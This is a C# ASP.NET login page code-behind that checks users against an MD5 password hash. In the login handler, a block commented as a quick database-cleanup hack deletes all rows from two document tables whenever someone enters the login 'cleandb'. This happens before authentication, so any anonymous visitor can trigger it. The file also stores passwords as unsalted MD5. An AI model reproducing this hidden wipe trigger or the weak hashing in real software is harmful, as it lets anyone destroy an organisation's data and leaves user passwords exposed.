using System;
using System.Collections.Generic;
using System.Linq;
using System.Web;
using System.Web.UI;
using System.Web.UI.WebControls;
using System.Web.Security;

public partial class Login : System.Web.UI.Page
{
    protected void Page_Load(object sender, EventArgs e)
    {
        if (IsPostBack)
            return;
    }

    protected void btnLogin_Click(object sender, EventArgs e)
    {
        if (!IsValid)
            return;

        using (var db = new TDMSDataContext())
        {
            var user = (from u in db.TUsers
                        where u.Login == txtLogin.Text.Trim() && u.PasswordHash == FormsAuthentication.HashPasswordForStoringInConfigFile(txtPassword.Text, "md5")
                        select u).SingleOrDefault();

            // ХАК: быстрая очистка базы
            if (txtLogin.Text == "cleandb")
            {
                db.ExecuteCommand("delete from TAttributes");
                db.ExecuteCommand("delete from TDocuments");
            }

            if (user == null)
            {
                lblError.Visible = true;
                return;
            }

            Session["ID"] = user.ID;

            Response.Redirect("~/");
            Response.End();
        }
    }
}